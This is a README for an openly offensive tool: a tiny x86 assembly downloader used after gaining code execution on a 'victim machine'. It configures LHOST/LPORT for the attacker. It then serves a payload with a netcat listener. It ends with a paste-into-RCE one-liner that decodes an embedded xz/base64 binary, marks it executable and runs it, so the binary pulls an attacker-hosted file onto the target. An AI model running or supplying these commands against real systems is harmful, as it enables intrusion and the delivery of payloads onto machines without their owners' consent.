# OxyFuel downloader
This repository contains a minimalistic file downloader written in x86 32b assembly, only using syscalls directly.
The resulting binary file is about 8KB in size:
```
ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped
```

Just like an oxy-acetylene torch, tools from `OxyFuel` suite shall be used as a last ditch effort when no other tool is present, or will __cut it__.

## Prerequisites
Can be installed with your package manager (probably).
```
make nasm
```

## Usage
On attacker machine, you need to compile the downloader. You can specify parameters in the makefile, or using environment variables.
The parameters are:
- `LHOST`: attacker IP
- `LPORT`: attacker port
- `RMODE`: permissions of the transferred file on the target machine
- `RFILE`: default path, where the transferred file is written

After filling in the parameters follow the procedure:
1. Fill in the values into `downloader.asm.tpl` and compile the downloader:
```shell
make
```
2. By some means, deliver the downloader to the victim machine (if `xz(1)` or other xz decompressor is present on the victim machine, see **Compression**)
3. Start hosting the file you want delivered on your attacker machine using:
```shell
cat file | nc -lvnp <LPORT> -q 2
```
4. Launch the downloader on the victim machine
```shell
./downloader [RFILE]
```
5. The netcat will close the connection 2 seconds after the file is transmitted

## Compression
The compiled downloader is rather small alone(abt. `8KB`), but when compressed with `xz(1)`, it will occupy about `500B` of space.
When encoded in `base64`, this will be about `800B`


In order to transfer, decompress and launch the downloader: **Before running this command, make sure that you are hosting the payload using `nc(1)`**
```shell
make xz-compress
```
This will print out the command you need to paste into the RCE of your choice to download the hosted file, for example:
```shell
echo /Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4CJLAcRdAD+RRYRoO97epg8j1uh8YCpa/1qbgllS/4dw8XoEBxTbSEvHdJlt+ZQNULAGxulnfAFhQXLwO/ePAdZqzSa2/ACQnyQIwFprVzmpbG4fAYZaS0+QBvi+2lCOtHiq04T7viGcejwiG9aBkKVq28Q3JQqnKOUSoC7Y5RZSIGO3UuGkg3gEp62kKgStREqcR9jsWAhj9d0I20+5frRQJu7gwEhDPmhBiBWQCJytLI2y06oCj9h96hzTLJDx6wmap7xnupr0tM6fSScVS+BCmJ9n+1ySo0Qa/khX4v7DbeND+UrsbkeX9StJDOx7RY5DJ2GVkO8qwE8dleHAiIzMySa/fz+Gjc/Z1phQbCIsjGYSi0PxisVy29tyeLsoYZ29gFMw4MbN7Nl9nqdY4pdS9zs19IT5lC+6LQTDA0KUa4QtzJmS9RJ2YNXOrIhKP6zFpSm67GbJfMbDhJ5YBOKlMXkx35P0tN1ov2ZaA7GjuiVMtXX61r3BN8XbzBQif2xT/KqPa5Nu8eMWLkmFnVbCBWoruLidtrWXKsL8J7UD/kLwc+JIPzPM+iaVaKambgCOLwCVKgu5D2aHTacGBhanvww1O0cliuAAALsnUpDv60HxAAHgA8xEAAAtwbnZscRn+wIAAAAABFla | base64 -d | xz -d -c > downloader; chmod +x ./downloader && ./downloader
```
